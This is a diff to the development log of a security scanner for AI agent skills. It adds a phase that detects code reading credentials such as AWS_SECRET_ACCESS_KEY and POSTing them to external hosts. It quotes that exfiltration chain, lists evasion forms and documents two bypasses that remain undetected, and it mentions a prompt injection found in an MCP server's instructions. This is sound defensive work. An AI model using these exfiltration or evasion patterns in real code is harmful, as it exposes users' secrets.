@@ -16,7 +16,8 @@ docs → PR → squash-merge → GitHub release.
 | D | Exfil / evasion breadth | v1.4.0 | [#4](https://github.com/AntonioTimo/skillchecker/pull/4) | ✅ released |
 | E | Evasion v2 (normalization + homoglyph domains) | v1.5.0 | [#5](https://github.com/AntonioTimo/skillchecker/pull/5) | ✅ released |
 | F | Supply-chain (bundled dependency manifests) | v1.6.0 | [#6](https://github.com/AntonioTimo/skillchecker/pull/6) | ✅ released |
-| G | MCP / hook destination reputation (CR040) | v1.7.0 | — | 🚧 in review |
+| G | MCP / hook destination reputation (CR040) | v1.7.0 | [#8](https://github.com/AntonioTimo/skillchecker/pull/8) | ✅ released |
+| H | Taint / data-flow: credential → network exfil (TF001/TF002) | v1.8.0 | — | 🚧 in review |
 
 ---
 
@@ -346,3 +347,78 @@ and lock each form with a fixture + a CI snippet assert. The injected
 "run a version check" prompt one finder met inside an MCP server's session
 instructions was correctly ignored as out-of-scope — the auditor is the kind of
 target it audits for.
+
+## Phase H — Taint / data-flow: credential → network exfil (v1.8.0, TF001/TF002)
+
+**Goal.** Deepen the Python AST pass into **data flow**: connect a credential
+*source* to a network *sink* across intervening statements, so a secret that is
+read, packaged, and shipped in three separate lines is caught.
+
+**The gap (RED).** The line and AST passes classify one node at a time, so the
+canonical split-variable exfil —
+`token = os.environ["AWS_SECRET_ACCESS_KEY"]` → `payload = {"k": token}` →
+`requests.post(target_url, data=payload)` — produced only a single `HI009` HIGH
+(🟡 YELLOW). A skill reading a secret and POSTing it to a user-controlled URL or a
+bare public IP is exfiltration — the project's worst-failure class — yet read
+YELLOW. Proven by `examples/evil-taint/` (TF rules absent, exit 1 on the minimal
+single-chain case).
+
+**The fix (GREEN).** A new `taint_scan` pass (the `TF` family) — intraprocedural,
+source-order, monotonic — seeds taint from `os.environ`/`os.getenv`, propagates it
+through assignments, container literals, f-strings and concatenation (one
+descendant-walk rule gives all of those for free), and fires at an HTTP-client sink
+when a tainted value reaches the payload. **Severity is gated on the destination,
+not the flow** — the central FP control, since the legitimate authenticated-API
+client is the same shape: `TF001` CRITICAL for a reputation-bad / user-controlled
+destination (reusing the `CR040` `_reputation_bad_dest` machinery and a
+module-level `_EXFIL_HOST_RES` derived *from* the `CR026`/`CR034`/`CR038` line
+rules — one source of truth), `TF002` HIGH for a hardcoded named host. The pass is
+**additive only**: it never suppresses a line/AST finding (`HI009` still fires),
+and the URL position is excluded from payload taint so a configurable `env → URL`
+endpoint is not a false CRITICAL.
+
+**Key decisions.** New `TF` family (not `AST009+`) — taint is a two-point
+reachability relation, conceptually distinct from the AST pass's single-call
+classification, and a distinct prefix keeps the additive-only invariant auditable.
+Credential→network **only** this phase (file-read/input sources, cross-function
+flow deferred). The design was chosen by a 3-way **design panel + judge** that
+resolved the severity-vs-budget tension by gating CRITICAL on the destination, and
+the panel's `_reputation_bad_dest`-needs-the-full-URL and `203.0.113.x`-is-TEST-NET
+(private!) catches went straight into the fixtures.
+
+**Verified.** Minimal single-chain YELLOW→RED (exit 1 → 3); `evil-taint` RED with
+TF001 across public-IP / user-URL / f-string / encoded-IP / punycode / webhook /
+urllib forms and TF002 on the named-host + loopback discrimination; `clean-taint`
+GREEN (credential reads with no sink); full 19-fixture sweep additive (every prior
+exit code unchanged); `scan.py` adds 0 TF self-findings.
+
+**Then the adversarial review round.** A 3-hunter pass (bypass/FN, false-positive,
+crash/edge-AST), each **reproducing every candidate against the live scanner**,
+then a per-finding independent verifier — 12 candidates, classified
+сейчас/OOS/refuted. **Four in-scope false negatives were confirmed and fixed**, each
+locked with a fixture form (V8–V11) + a CI snippet assert:
+- `requests.request("POST", url, …)` — `_sink_url_arg` returned the HTTP **method**
+  (arg0) as the destination, silently downgrading every `.request`-form exfil
+  TF001→TF002. The disease (not the symptom): the URL index is signature-dependent —
+  arg1 for `.request`, arg0 for the seven verb methods. Fixed once in the extractor.
+- **whole-environment reads** (`dict(os.environ)`, `os.environ.copy()/.items()`,
+  bare `os.environ`) were not credential sources — though strictly *more* dangerous
+  than a single key, and the docstring already claimed "all os.environ reads count".
+- `match`/`case` and `lambda` bodies were never traversed — a `lambda:` or `case`
+  wrapper silently dropped the verdict. Unified into one `_scan_sinks` walker
+  (lambda bodies as fresh scopes) + a `match_case` clause in `_child_blocks`.
+- Two residuals were **classified and documented, not patched**: a secret built
+  into a URL that is first bound to a variable (indistinguishable from a
+  configurable base-URL+path — fixing it trades an FN for an FP), and an
+  env-configured destination with an env value in the body reading `TF001` (the
+  every-`os.environ`-is-a-credential over-approximation — a panel **split
+  1-fix/2-intended**, and the over-paranoia doctrine kept it CRITICAL). The split
+  vote is exactly why the finding was adversarially verified rather than taken at
+  face value.
+
+The recurring lesson, re-applied to a new subsystem: an extractor that assumes one
+argument shape spawns sibling forms (here the `.request` signature), and a
+traversal that enumerates compound statements misses the ones added later (`match`);
+fix the root, lock each form with a fixture + CI snippet, and when a "false
+positive" is contested, let the destination gate (not a suppression heuristic) carry
+the budget.
